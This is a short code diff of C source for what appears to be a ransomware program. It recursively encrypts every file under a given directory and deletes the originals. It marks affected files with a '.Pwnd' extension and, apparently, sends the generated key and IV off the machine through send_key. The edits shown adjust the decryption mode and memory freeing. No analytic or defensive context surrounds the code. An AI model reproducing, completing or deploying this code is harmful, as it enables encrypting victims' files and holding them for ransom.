@@ -100,8 +100,9 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 				strcat(troiii,name);
 				strcat(troiii,"/");
 				strcat(troiii,entity->d_name);
-				strcat(troiii, ".Pwnd");
-				
+				// strcat(troiii, ".Pwnd");
+
+				// printf("%s \n", troiii);
 				decrypt(key, iv, troiii);
 				remove(troiii);
 			}
@@ -187,19 +188,19 @@ int main (int argc, char * argv[])
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 			send_key(pKey, pIv);
 			listdir(argv[1], iv, key, 'e');
-			
 		}
 		
 		if (strcmp(argv[2], "-dec")==0)
 		{
-			// hexa_to_bytes(argv[3] , key, sizeKey);
-			// hexa_to_bytes(argv[4] , iv, sizeIv);
+			hexa_to_bytes(argv[3] , key, sizeKey);
+			hexa_to_bytes(argv[4] , iv, sizeIv);
 			listdir(argv[1], iv, key, 'd');
 			
+			free((char *)pKey);
+			free((char *)pIv);
 			// printf("test");
 		}
 		
-		free((char *)pKey);
-		free((char *)pIv);
 	}
 }
+
